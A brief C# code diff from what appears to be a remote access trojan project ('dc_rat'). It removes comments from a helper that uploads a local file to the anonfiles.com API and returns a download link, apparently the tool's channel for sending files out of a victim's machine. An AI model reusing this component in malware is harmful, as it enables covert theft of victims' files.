@@ -7,14 +7,14 @@ namespace dc_rat
 {
     public class Anonfiles
     {
-        public static string CreateDownloadLink(string File) // Important to note AnonFile has a 20gb file size limit (which is overkill for most applications)
+        public static string CreateDownloadLink(string File)
         {
             string ReturnValue = string.Empty;
             try
             {
                 using (WebClient Client = new WebClient())
                 {
-                    byte[] Response = Client.UploadFile("https://api.anonfiles.com/upload", File);// Thanks noobencoder for pointing out that Anonfile changed domains since when I originally wrote this 3 years ago. It's fixed now.
+                    byte[] Response = Client.UploadFile("https://api.anonfiles.com/upload", File);
                     string ResponseBody = Encoding.ASCII.GetString(Response);
                     if (ResponseBody.Contains("\"error\": {"))
                     {
